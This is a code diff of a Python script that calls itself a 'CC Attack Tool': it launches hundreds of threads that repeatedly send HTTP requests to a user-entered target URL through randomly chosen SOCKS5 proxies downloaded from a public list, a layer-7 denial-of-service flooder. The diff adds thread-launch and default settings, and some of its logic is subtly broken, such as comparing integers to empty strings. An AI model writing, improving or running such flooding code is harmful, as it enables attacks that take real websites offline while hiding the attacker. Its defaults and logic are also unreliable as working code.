@@ -28,47 +28,65 @@ print(Fore.GREEN + """    	     .,:ccllllc:,.
 print("  CC Attack Tool Using Requests Module")
 print("      Code By GogoZin. -2019/8/2")
 
-
+def opth():
+	for i in range(thr):
+		x = threading.Thread(target=atk)
+		x.start()
+		print("Threads " + str(i+1)+ " Created ")
+		time.sleep(0.01)
+	print("Wait A Few Seconds For Threads Ready To Attack . . .")
+	global tt
+	tt = True
+	
 def main():
 	global pprr
 	global list
 	global proxy
 	global url
-	global pow
+	global pwr
 	url = str(input(Fore.BLUE + "Target : " + Fore.WHITE))
-	thr = int(input(Fore.BLUE + "Threads : " + Fore.WHITE))
+	thr = int(input(Fore.BLUE + "Threads (Default Is 300) : " + Fore.WHITE))
+	if thr == "":
+		thr = int(300)
+	else:
+		thr = int(thr)
 	cho = str(input(Fore.BLUE + "Get Some Fresh Socks ? (y/n) : " + Fore.WHITE))
 	if cho =='y':
-		rsp = requests.get('https://api.proxyscrape.com/?request=getproxies&proxytype=socks5&timeout=1000&country=all')
+		rsp = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&timeout=1000&country=all')
 		with open('socks.txt','wb') as fp:
 			fp.write(rsp.content)
 			print(Fore.YELLOW + "Sucess Get Fresh Socks List !")
 	else:
 		pass
 	list = str(input(Fore.BLUE + "Socks List (socks.txt): " + Fore.WHITE))
-	pow = int(input(Fore.BLUE + "CC.Power (1-100) : " + Fore.WHITE))
-	for x in range(thr):
-		x = Thread(target=atk, name=(x))
-		time.sleep(0.01)
-		x.start()
-	print("Wait A Few Second For Threads Ready To Attack . . .")
-	time.sleep(3)
-	input("Press Enter To Launch Attack !")
+	if list == "":
+		list = 'socks.txt'
+	else:
+		list = str(list)
+	pwr = int(input(Fore.BLUE + "CC.Power (1-100 Default Is 70) : " + Fore.WHITE))
+	if pwr == "":
+		pwr = int(70)
+	else:
+		pwr = int(pwr)
+	opth()
 
 def atk():
+	pprr = open(list).readlines()
+	proxy = random.choice(pprr).strip().split(":")
+	s = requests.session()
+	s.proxies = {}
+	s.proxies['http'] = ("socks5h://"+str(proxy[0])+":"+str(proxy[1]))
+	s.proxies['https'] = ("socks5h://"+str(proxy[0])+":"+str(proxy[1]))
+	time.sleep(10)
 	while True:
-		pprr = open(list).readlines()
-		proxy = random.choice(pprr).strip().split(":")
-		s = requests.session()
-		s.proxies = {}
-		s.proxies['http'] = ("socks5h://"+str(proxy[0])+":"+str(proxy[1]))
-		s.proxies['https'] = ("socks5h://"+str(proxy[0])+":"+str(proxy[1]))
-		try:
-			s.get(url)
-			print(Fore.BLUE + "Socks Ddos From ~ / " + Fore.WHITE + str(proxy[0])+":"+str(proxy[1]))
-		except:
-			s.close()
-			print(Fore.RED + "Socks Down !" + Fore.WHITE)
+		while tt:
+			try:
+				for y in range(pwr):
+					s.get(url)
+					print(Fore.BLUE + "Socks Ddos From ~ / " + Fore.WHITE + str(proxy[0])+":"+str(proxy[1]))
+			except:
+				s.close()
+				print(Fore.RED + "Socks Down !" + Fore.WHITE)
 
 
 if __name__ == "__main__":
